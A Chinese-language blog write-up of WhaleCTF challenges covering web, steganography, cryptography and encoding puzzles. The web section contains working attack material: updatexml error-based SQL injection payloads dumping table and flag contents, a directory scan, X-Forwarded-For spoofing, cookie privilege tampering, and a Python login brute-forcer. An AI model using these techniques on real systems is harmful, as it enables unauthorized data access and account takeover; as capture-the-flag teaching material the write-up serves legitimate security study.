---
layout: post
title: WhaleCTF WriteUp
date: 2018-2-5
author: Qiqi
header-img: img/images-1.jpg
catalog: true
tag:
   - write up
   - CTF
---

# WhaleCTF WriteUp

## Web

### SQL注入

首先，我们输入1，返回正常页面

然后我们在输入1'，报错

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

可以看出，这题我们不需要去闭合引号啥的

接着，我们利用order by语句，查询列数

```sql
1 order by 1
```

最终得到一共有4列

接着进入正题，我们这里使用xmlupdate的报错注入

**1. 查询数据库名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select database()),1,31))),1)
```

提交，成功得到数据库名

```sql
XPATH syntax error: '~sqli'
```

**2. 查询表名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,31))),1)
```

提交得到

```Sql
XPATH syntax error: '~flag'
```

很显然，这就是flag所在的表

**3. 查询列名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,31))),1)
```

提交得到

```sql
XPATH syntax error: '~flag'
```

也很显然，flag肯定在这一列

**4. 查询字段**

```sql
1 and updatexml(1,concat(0x7e,(mid((select flag from flag limit 0,1),1,31))),1)
```

提交得到

```sql
XPATH syntax error: '~abcd1234'
```

根据题目要求，flag{abcd1234}

### Find me

查看源代码

在注释中找到flag:{This_is_s0_simpl3}

### http呀

这题想了好久，然而毫无思路，于是最终拿去扫了一下，这里我用的dirsearch，也可以用御剑

```
qiqi@qiqi-Mac ~/dirsearch> python3 dirsearch.py -u "http://39.107.92.230/web/web2" -e * -t 60

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | Threads: 60 | Wordlist size: 6029

Error Log: /Users/qiqi/dirsearch/logs/errors-18-02-02_21-46-54.log

Target: http://39.107.92.230/web/web2

[21:46:54] Starting:
[21:47:04] 200 -  315B  - /web/web2/index.html
[21:47:04] 200 -  405B  - /web/web2/index.php
[21:47:04] 200 -  405B  - /web/web2/index.php-bak
[21:47:04] 200 -  405B  - /web/web2/index.php.bak
[21:47:04] 200 -  405B  - /web/web2/index.php/login/
[21:47:04] 200 -  405B  - /web/web2/index.php3
[21:47:04] 200 -  405B  - /web/web2/index.php5
[21:47:04] 200 -  405B  - /web/web2/index.php~
[21:47:04] 200 -  405B  - /web/web2/index.php4
```

我们看到了index.php这个文件

我们用curl看一下返回结果

```
qiqi@qiqi-Mac ~> curl http://39.107.92.230/web/web2/index.php
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Careful</title>
</head>
<body alink="#007000"  bgcolor="#000000" link="gold" text="#008000" vlink="#00c000">
<center>
<br><br>
<center>
<h1>Do you know what happend just now?!</h1>
<script>
window.location.href="index.html";
</script>
</center>
<br>
<br>
<br>
<!--flag:{Y0u_ar3_s0_Car3ful}-->
</html>
```

这样我们就得到了flag:{Y0u_ar3_s0_Car3ful}

### 本地登陆

题目要求本地登陆，我们很容易想到XFF头

所以抓包添加XFF头部

X-Forwarded-For: 127.0.0.1

得到新的提示：You are not admin.Get out!

于是我们还要将isadmin的值改为1

最终成功得到flag:{Why_ar3_y0u_s0_dia0}

### 密码泄露

查看源代码，发现password.txt文件，发现里面有很多密码，但我们不可能一个一个去试

直接上python

```python
import requests
url = "http://39.107.92.230/web/web5/password.txt"
r = requests.get(url)
res = r.text.split('\r\n')
for i in res:
  r = requests.post("http://39.107.92.230/web/web5/index.php", data={'username':'admin', 'password':i})
  if "False" not in r.text:
    print i
    break
```

得到密码：Nsf0cuS

输入，进入新页面，说这里没有flag

我们打开开发者工具，在Network选项中，我们在cookie一栏，看到newpage，后面是一串很像base64编码的字符，解码得到290bca70c7dae93db6644fa00b9d83b9.php

进入页面，提示要以小黑的身份留言

于是抓包

将IsLogin的值改为1

一开始尝试把userlevel改为admin，后来发现应该改为root

发送请求，在Set-Cookie头部看到Flag=flag%7BC0ngratulati0n%7D

URL编码解码得到flag{C0ngratulati0n}

## 隐写

### Find

根据图片的名称，得到提示，应该是LSB隐写，用神器stegsolve打开，找到一张二维码，但和我们通常看到的二维码不太一样，黑白颜色是反着的，所以我们用ps反色一下，扫码得到flag{hctf_3xF$235#\\x5e3}

### 被我吃了

binwalk跑一下

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
103315        0x19393         Zip archive data, at least v2.0 to extract, compressed size: 25, uncompressed size: 23, name: flag.txt
103468        0x1942C         End of Zip archive
```

看到存在zip压缩包

再用一下foremost

打开压缩包，发现flag.txt，打开得到flag{WelcomeT3WhaleCTF}

### 合体鲸鱼

还是用binwalk跑一下

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
103315        0x19393         JPEG image data, JFIF standard 1.01
```

发现有两张jpg图片

用一下foremost，得到两张jpg图片，其中一张就是flag：flag{youfindmeWHALE}

### 亚种

用0xED打开看一下

直接查找flag，找到flag{firsttry}

### 下雨天

预览打开图片，看到一共有6张图片，flag就藏在第5张里：GUETCTF{Y0u_sEE_m3}

### 这是什么

用0xED打开，在最后发现一串&#ACSII编码的字符串

```
&#102;&#108;&#97;&#103;&#123;&#112;&#69;&#51;&#107;&#81;&#122;&#109;&#97;&#77;&#78;&#125;
```

解码得到flag{pE3kQzmaMN}

### IHDR

IHDR一般是要修改图片的长度，使图片的下面的部分显示出来

所以我们要修改图片的长度

用notepad++打开

png头部：89 50 4E 47 0D 0A 1A 0A

IHDR：0d 49 48 44 52  

接着后四位是宽度，我们不要去调，再后四位是长度，我们要调大一些

我们将09 90改为0f f0

打开图片，得到FLAG{ihDR_ALSO_FUN}

### 愤怒的小猪

还是由图片的名字猜测应该是LSB隐写，用stegsolve打开

找到一张二维码

扫一下得到flag{AppLeU0}

### 底片

图片名称写的是jpg格式，其实是个bmp格式的

通过题目信息，猜测是LSB隐写（这题不是在最低位隐藏了二维码，而是将最低层次的二进制代码直接替换为flag的ASCII码）

BMP文件头部：

| 字段名         | 大小（单位：字节） | 描述                                     |
| :---------- | :-------- | :------------------------------------- |
| bfType      | 2         | 位图类别，根据不同的操作系统而不同，在Windows中，此字段的值总’BM’ |
| bfSize      | 4         | BMP图像文件的大小                             |
| bfReserved1 | 2         | 总为0                                    |
| bfReserved2 | 2         | 总为0                                    |
| bfOffBits   | 4         | BMP图像数据的地址（倒序）                         |

首先读取bfOffBits字段，找到数据块偏移，然后读取数据块，提取最低位，将二进制每八位转换为ASCII即可找到flag

还是写个python脚本

```python
def decode(file):
    f = open(file,'rb').read()
    bfOffBits=int(f[13:9:-1].encode('hex'),16)

    s = ""
    for i in xrange(bfOffBits,len(f)):
        s += str(ord(f[i])&0x1)
    lst = [chr(int(s[i:i+8], 2)) for i in xrange(0, len(s), 8)]
    fsave=open("flag", 'wb')
    fsave.write("".join(lst))
    fsave.close()

decode(raw_input("input file_name: "))
```

运行一下

用notepad++打开生成的文件得到flag：key_is_SimCTF{LSB_yinxie}

### 真是动图

图片无法打开，用notepad++打开，发现头部缺少GIF8，正常gif头部是GIF89(7)a

修改一下，发现能正常打开了

查看每一张图，得到：PASSWORD is Y2F0Y2hfdGhlX2R5bmFtaWNfZmxhZ19pc19xdWl0ZV9zaW1wbGU=

base64解码得到catch_the_dynamic_flag_is_quite_simple，所以flag就是key{catch_the_dynamic_flag_is_quite_simple}

## 密码学

### Death_Chain

百度一下夏多的密码

![](https://ws1.sinaimg.cn/large/006Vib6xgy1fno4twfu0gj30cx0s0jt0.jpg)

解码得到FLAGISHELPMEOUTPLEASE

⚠️题目中说，所有解密内容，我就在这栽了:sweat:

最终的flag是flag{FLAGISHELPMEOUTPLEASE}

### 检查符号

摩斯电码的变形

将o替换为.

将0替换为-

将。替换为空格或者/

解码得到WELCOMETOVENUSCTF

⚠️我们要将字母改为小写

所以flag是key{welcometovenusctf}

### 德军密码

```
0000011000000000101010110111001011000101100000111001100100111100111001
```

从密文长度和密钥helloworld的长度猜测应该是将密文7个一组分成10个7位二进制数，然后鱼密钥进行异或处理

写个python脚本

```python
str_bin = raw_input("str_bin:")
str_key = raw_input("str_key:")
list_bin = []
flag = ''
for i in range(len(str_key)):
    list_bin.append(str_bin[7 * i : 7 * i + 7])
for i in range(len(str_key)):
    flag += chr(int(list_bin[i], 2) ^ ord(str_key[i]))
print flag
```

运行得到：key[yahkr]

所以flag是key{yahkr}

### 密钥生成

利用拓欧算法写个python脚本：

```python
def ext_euclid ( a , b ):
     if (b == 0):
         return 1, 0, a
     else:
         x , y , q = ext_euclid( b , a % b )
         x , y = y, ( x - (a / b) * y )
         return x, y, q
         
p=473398607161
q=4511491
e = 17
fn = (p - 1) * (q - 1)
x, y, q = ext_euclid(fn, e)
print y
```

输出：125631357777427553

所以flag是key{125631357777427553}

### 规则很公平

根据提示：**公平**

想到了**波雷费密码**（英语：**Playfair cipher**）

本题密码标如下：

C	U	L	T	R

E	A	B	D	F

G	H	I	K	M

N	O	P	Q	S

V	W	X	Y	Z

密文：CGOCPMOFEBMLUNISEOZY

两两一组：

CG	OC	PM	OF	EB	ML	UN	IS	EO	ZY

解密：

VE	NU	SI	SA	FA	IR	CO	MP	AN	YX

可以看出最后的X是补加的，所以我们要把它去掉

所以flag就是：key{VENUSISAFAIRCOMPANY}

我们也可以用python脚本

```python
#coding:utf-8

str_1 = raw_input("input the 25 letters: ") # 25位，写成5*5的密码表
str_2 = ""
str_3 = ""
str_4 = "abcdefghiklmnopqrstuvwxyz" #去掉 j 因为ij在一起
str_5 = ""
str_6 = raw_input("input the rule: ") #要解密的规则  两两分组
list_1 = []
str_7 = ""

def zhongheng(abc, adc):
    a = 0
    x1 = ""
    y1= ''
    x2 = ""
    y2 = ""
    for i in list_1:
        i = list(i)
        if abc in i:
            x1 = a
            y1 = i.index(abc)

        else:
            pass
        if adc in i:
            x2 = a
            y2 = i.index(adc)
        else:
            pass
        a += 1
    print x1, y1, x2, y2

    if x1 == x2:
        if y1 == 0 and y2 == 0:
            return str(list_1[x1][4]) + str(list_1[x2][4])
        if y1 == 0 and y2 != 0:
            return str(list_1[x1][4]) + str(list_1[x2][y2 - 1])
        if y1 != 0 and y2 == 0:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][4])
        else:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][y2 - 1])

    if y1 == y2:
        if x1 == 0 and x2 == 0:
            return str(list_1[4][y2]) + str(list_1[4][y2])
        if x1 == 0 and x2 != 0:
            return str(list_1[4][y1]) + str(list_1[x2 - 1][y2])
        if x1 != 0 and x2 == 0:
            return str(list_1[x1 - 1][y1])+ str(list_1[4][y2])
        else:
            return str(list_1[x1 - 1][y1]) + str(list_1[x2 - 1][y2])

    aaie = str(list_1[x1][y2]) + str(list_1[x2][y1])
    return aaie


#去除空格
for i in str_1:
    str_2 += i.strip(" ")

#去掉重复和j
for i in str_2:
    if i in str_3:
        pass
    elif i == "j":
        pass
    else:
        str_3 += i

#填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序）
for i in str_4:
    if i in str_3:
        pass
    else:
        str_5 += i
str_3 += str_5

flag = ""

#分为 5x5 的数组
for i in range(5):
    list_1.append(str_3[i * 5 : i * 5 + 5])

for i in range(0, len(str_6), 2):
    flag += zhongheng(str(str_6[i]), str(str_6[i+1]))
print "flag: " + flag
```
跑一下，也能得到相同的结果

### 栅栏密码

提示：第一根和第二根都被换了位置····只有第三根还能站在那，缺也短了一截了

我们将这串字符，三个一行

```
udJ
Zml
2VY
VuW
kdx
XXs
2Ne
1DV
5V9
XEs
2Zd
Z7W
lSN
bVr
m9e
NDS
laF
XG9
1F
```

看起来很符合题意，每一列是一根栅栏

然后我们要将第一列和第二列换个位置,然后一列一列的读取

```
dmVudXNDVEZ7SV9DaGFuZ2VkX215X2Z1bmN1X1J1YWxseV9sdWNreSF9
```

base64解码得到：venusCTF{I_Changed_my_funcu_Rually_lucky!}

### 小明入侵

写个python脚本

```python
import hashlib

str_key = 'key{xxxx}'
str_md5_fore10 = 'a74be8e20b'
list_base = list('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
strtmp = list(str_key)
for i in range(len(list_base)):
    strtmp[4] = list_base[i]
    for j in range(len(list_base)):
        strtmp[5] = list_base[j]
        for k in range(len(list_base)):
            strtmp[6] = list_base[k]
            for l in range(len(list_base)):
                strtmp[7] = list_base[l]
                strtmp_md5 = str(hashlib.md5(''.join(strtmp)).hexdigest())
                if(strtmp_md5[0 : 10] == str_md5_fore10):
                    print ''.join(strtmp), strtmp_md5
```

运行一下

```
key{BNdE} a74be8e20b51bd528d46681a19bb8560
```

flag就是key{BNdE}

### RSA专家

打开压缩包，发现两个文件，用notepad++打开，有两个文件，一个是endata，另一个是aaaa，发现endata应该是一个加密文件，aaaa打开是私钥，而又根据题目名称，推断endata应该是RSA加密的，所以我们使用openssl来解密

```
qiqi@qiqi-Mac ~/Desktop> openssl rsautl -decrypt -in endata -inkey aaaa -out flag.txt
```

打开flag.txt得到flag：key{c42bcf773d54cf03}

## 杂项

### Decode1

得到一串数字，猜测是16进制的数

```
253444253534253435253335253433253641253435253737253444253531253646253738253444253434253637253442253446253534253642253442253444253534253435253738253433253641253435253737253446253531253646253738253444253434253435253442253444253534253435253332253433253641253435253738253444253531253646253738253444253534253637253442253444253534253431253738253433253641253435253738253444253431253646253738253444253534253633253442253444253534253435253331
```

所以两个数字一组，然后16进制转10进制

```
37 52 68 37 53 52 37 52 53 37 51 53 37 52 51 37 54 65 37 52 53 37 55 55 37 52 68 37 53 49 37 54 70 37 55 56 37 52 68 37 52 52 37 54 55 37 52 66 37 52 70 37 53 52 37 54 66 37 52 66 37 52 68 37 53 52 37 52 53 37 55 56 37 52 51 37 54 65 37 52 53 37 55 55 37 52 70 37 53 49 37 54 70 37 55 56 37 52 68 37 52 52 37 52 53 37 52 66 37 52 68 37 53 52 37 52 53 37 51 50 37 52 51 37 54 65 37 52 53 37 55 56 37 52 68 37 53 49 37 54 70 37 55 56 37 52 68 37 53 52 37 54 55 37 52 66 37 52 68 37 53 52 37 52 49 37 55 56 37 52 51 37 54 65 37 52 53 37 55 56 37 52 68 37 52 49 37 54 70 37 55 56 37 52 68 37 53 52 37 54 51 37 52 66 37 52 68 37 53 52 37 52 53 37 51 49  
```

接着ACSII转Char

```
%4D%54%45%35%43%6A%45%77%4D%51%6F%78%4D%44%67%4B%4F%54%6B%4B%4D%54%45%78%43%6A%45%77%4F%51%6F%78%4D%44%45%4B%4D%54%45%32%43%6A%45%78%4D%51%6F%78%4D%54%67%4B%4D%54%41%78%43%6A%45%78%4D%41%6F%78%4D%54%63%4B%4D%54%45%31
```

得到URL编码的一串字符，解码

```
MTE5CjEwMQoxMDgKOTkKMTExCjEwOQoxMDEKMTE2CjExMQoxMTgKMTAxCjExMAoxMTcKMTE1
```

又得到了一串base64编码的字符，解码

```
119 101 108 99 111 109 101 116 111 118 101 110 117 115 
```

再次ASCII转Char

```
welcometovenus
```

根据题目要求，key{welcometovenus}

### Decode3

jsfuck，直接扔进console里面运行一下

```
flag=itisjavascriptenjoy%21
```

URL编码解码

```
flag=itisjavascriptenjoy!
```

所以flag是key{itisjavascriptenjoy!}

### Decode8

根据提示，先拿去凯撒解密，看到这样一串字符

```
f__l4}a_gf{u_nJ_u0s.t0
```

一眼就看出来是栅栏密码了

分个组，读一下，得到flag{\_Just_4_fun_0.0_}

### Decode10

根据提示，明文的md5值是16478a151bdd41335dcd69b270f6b985

扔进工具解一下

```
base64wtfwtf123
```

所以最终的flag就是flag{base64wtfwtf123}
